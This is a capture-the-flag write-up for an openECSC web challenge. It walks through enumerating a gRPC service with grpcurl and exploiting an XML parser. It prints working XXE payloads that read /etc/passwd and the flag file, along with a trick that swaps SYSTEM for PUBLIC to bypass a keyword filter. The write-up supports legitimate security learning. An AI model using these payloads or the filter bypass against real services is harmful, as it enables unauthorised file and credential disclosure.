# Grand Resort for Pwning Cats

## Description

```
Welcome to the Grand Resort for Pwning Cats. Are you ready to become the cutest pwner kitten at our establishment?

The flag is stored in /flag.txt

Site: http://grandresort.challs.open.ecsc2024.it
```

## Categories

- `web`

## Provided Files

- `backend.zip`

## Solve Process

Upon inspecting the provided source code, we quickly notice that we can disregard the frontend completely, while only one file is of interest, namely a `.proto` file. We can also observe that we are dealing with a gRPC endpoint here, but are not given any endpoints in the backend code.

```go
type receptionServer struct {
    pb.UnimplementedReceptionServer
}

// Endpoints' definition are in endpoints.go, which is not provided... eheheh not so easy now, uh?

func main() {
    flag := os.Getenv("FLAG")
    err := os.WriteFile("/flag.txt", []byte(flag), 0644)
    if err != nil {
        panic(err)
    }

    lis, err := net.Listen("tcp", "0.0.0.0:38010")
    if err != nil {
        log.Fatalf("failed to listen: %v", err)
    }

    grpcServer := grpc.NewServer()
    pb.RegisterReceptionServer(grpcServer, &receptionServer{})
    reflection.Register(grpcServer)
    grpcServer.Serve(lis)
}
```

The protobuf file looks like this, but we can't really make much of it yet other than the basic structure of how this thing operates.

```t
service Reception {
    rpc listRooms (google.protobuf.Empty) returns (RoomList) {}
    rpc bookRoom (BookingInfo) returns (BookingConfirm) {}
}

message Room {
    string id = 1;
    string Name = 2;
    string description = 3;
    int32 price = 4;
}

message RoomList {
    repeated Room rooms = 1;
}

message BookingInfo {
    string roomId = 1;
    int32 nights = 2;
    string guestName = 3;
}

message BookingConfirm {
    string msg = 1;
}
```

Let's explore the backend a bit using a tool called `grpcurl`. It allows us to list endpoints and describe them in detail using the `describe` subcommand.

```bash
grpcurl -plaintext grandresort.challs.open.ecsc2024.it:38010 describe
# --- snip ---
GrandResort.Reception is a service:
service Reception {
  rpc bookRoom ( .GrandResort.BookingInfo ) returns ( .GrandResort.BookingConfirm );
  rpc createRoom73950029 ( .GrandResort.RoomRequestModel ) returns ( .GrandResort.RoomCreationResponse );
  rpc createRoomRequestModelc21a7f50 ( .google.protobuf.Empty ) returns ( .GrandResort.RoomRequestModel );
  rpc listRooms ( .google.protobuf.Empty ) returns ( .GrandResort.RoomList );
}
grpc.reflection.v1.ServerReflection is a service:
service ServerReflection {
  rpc ServerReflectionInfo ( stream .grpc.reflection.v1.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1.ServerReflectionResponse );
}
grpc.reflection.v1alpha.ServerReflection is a service:
service ServerReflection {
  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
}
```

After a bit of reading the manual of `grpcurl`, I discovered how to talk with these services, which is just a matter of chaining them together with the parent service. We can try out a few of them, but strikes interest in particular.

```bash
grpcurl -plaintext grandresort.challs.open.ecsc2024.it:38010 GrandResort.Reception/createRoom73950029
{
  "RoomCreationResponse": "Error while parsing: failed to create parse context: failed to execute XMLCreateMemoryParserCtxt: error creating parser"
}
```

It is complaining about some sort of XML error here, so why not provide it with some XML to see what it does. We can do that by specifying our payload using `-d`

```bash
grpcurl -plaintext -d '{ "RoomRequestModel": "<test></test>" }' grandresort.challs.open.ecsc2024.it:38010 GrandResort.Reception/createRoom73950029
{
  "RoomCreationResponse": "You requested the creation of "
}
```

Aha, so it is trying to create something. This is where we can look at the protobuf file from earlier again, which specifies how a room should generally look like.

```t
message Room {
    string id = 1;
    string Name = 2;
    string description = 3;
    int32 price = 4;
}
```

Let's apply this knowledge to build a new payload.

```bash
grpcurl -plaintext -d '{ "RoomRequestModel": "<room><name>Test</name></room>" }' grandresort.challs.open.ecsc2024.it:38010 GrandResort.Reception/createRoom73950029
{
  "RoomCreationResponse": "You requested the creation of Test"
}
```

Now that works, now all that is left to do is to try and abuse this. When we think XML, we thing XXE, which I have less to no experience with. So I spend some time googling about payloads and quickly found a defacto standard payload which I tried.

```bash
grpcurl -plaintext -d '{ "RoomRequestModel": "<!DOCTYPE room [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><room><name>&xxe;</name></room>" }' grandresort.challs.open.ecsc2024.it:38010 GrandResort.Reception/createRoom73950029
{
  "RoomCreationResponse": "Error: you can't use the S-word!"
}
```

And as we can see the endpoint is not really happy about that and tells us to stop using the S-word. Alright then, let's search for an alternative that does not use `SYSTEM`. This took me longer than I thought until I stumbled upon [this repo](https://github.com/swisskyrepo/PayloadsAllTheThings), which states the following.

```plain
SYSTEM and PUBLIC are almost synonym.

<!ENTITY % xxe PUBLIC "Random Text" "URL">
<!ENTITY xxe PUBLIC "Any TEXT" "URL">
```

Very nice, so how about we try this instead.

```bash
grpcurl -plaintext -d '{ "RoomRequestModel": "<!DOCTYPE room [ <!ENTITY xxe PUBLIC \"sadafasd\" \"file:///etc/passwd\"> ]><room><name>&xxe;</name></room>" }' grandresort.challs.open.ecsc2024.it:38010 GrandResort.Reception/createRoom73950029
{
  "RoomCreationResponse": "You requested the creation of root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
}
```

Oh Hello there, that is a file leak. Now `/etc/passwd` is cool and all, but actually we want something different, right?

```bash
grpcurl -plaintext -d '{ "RoomRequestModel": "<!DOCTYPE room [ <!ENTITY xxe PUBLIC \"sadafasd\" \"file:///flag.txt\"> ]><room><name>&xxe;</name></room>" }' grandresort.challs.open.ecsc2024.it:38010 GrandResort.Reception/createRoom73950029
{
  "RoomCreationResponse": "You requested the creation of openECSC{UWu_r3fl3ktIng_K17T3n5_uWU_XXX}"
}
```
